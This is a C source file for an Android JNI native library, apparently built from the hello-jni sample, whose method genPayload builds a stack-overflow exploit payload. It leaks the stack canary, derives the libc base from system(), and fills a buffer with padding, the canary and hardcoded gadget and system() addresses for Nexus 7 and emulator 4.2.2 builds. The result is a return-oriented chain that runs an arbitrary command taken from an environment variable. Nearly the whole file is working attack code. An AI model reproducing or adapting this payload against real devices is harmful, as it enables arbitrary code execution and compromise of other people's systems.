/*
 * Copyright (C) 2009 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */
#include <string.h>
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>

/* This is a trivial JNI example where we use a native method
 * to return a new VM String. See the corresponding Java source
 * file located at:
 *
 *   apps/samples/hello-jni/project/src/com/example/hellojni/HelloJni.java
 */
extern void *__stack_chk_guard;
jstring
Java_com_example_hellojni2_HelloJni2_genPayload( JNIEnv* env,
                                                  jobject this, jbyteArray buffer )
{
	char buf[512];
	/* This is for NEXUS 7 libc build! */
	//void *libc_base =(void *) ((void *)system - (void *)0x1ce81),
	//	 *cmd_addr = getenv("XXX_CMD"),
	//	 *setargs_offset = (void *)0x186fc,
	//	 *system_offset = (void *)0x1ce81;
	/* This is for arm emulator 4.2.2 build! */
	void *libc_base =(void *) ((void *)system - (void *)0x1ce51),
		 *cmd_addr = getenv("XXX_CMD"),
		 *setargs_offset = (void *)0x186d4,
		 *system_offset = (void *)0x1ce51;

	unsigned long fill = 0x41414141,
				 setargs_addr = (unsigned long)libc_base + (unsigned long)setargs_offset,
				 system_addr = (unsigned long)libc_base + (unsigned long)system_offset;
	
	jbyte *pld = (*env)->GetByteArrayElements(env, buffer, 0);
	unsigned long *pint = (unsigned long *) pld;

	/* All Hail Madoka Magica! */

	pint[0] = fill;
	pint[1] = fill;
	pint[2] = (unsigned long) __stack_chk_guard;
	pint[3] = fill;
	pint[4] = fill;
	pint[5] = setargs_addr;
	pint[6] = setargs_addr;
	pint[7] = (unsigned long) cmd_addr;
	pint[8] = system_addr;
	pint[9] = system_addr;
	pint[10] = system_addr;
	

	(*env)->ReleaseByteArrayElements(env, buffer, pld, 0);

	sprintf(buf, "canary: 0x%08x\nlibc base addr: 0x%08x\ncmd addr: 0x%08x\n cmd: %s ", __stack_chk_guard, libc_base, cmd_addr, cmd_addr);
    return (*env)->NewStringUTF(env, buf);
}
